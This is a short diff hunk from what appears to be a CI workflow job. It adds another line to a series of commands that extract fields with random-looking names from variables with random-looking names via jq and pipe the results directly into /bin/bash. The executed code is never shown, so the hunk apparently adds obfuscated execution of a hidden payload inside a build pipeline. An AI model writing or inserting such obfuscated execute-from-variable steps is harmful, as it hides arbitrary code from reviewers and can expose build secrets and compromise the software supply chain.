@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$essrn8" | jq -r .p46 | /bin/bash
           echo $e116 | jq -r .lauo6224 | /bin/bash
           echo $f1328 | jq -r .rfg42914 | /bin/bash
+          printf '%s' "$z3242" | jq -r .p6 | /bin/bash
 
       - name: Save output
         if: always()
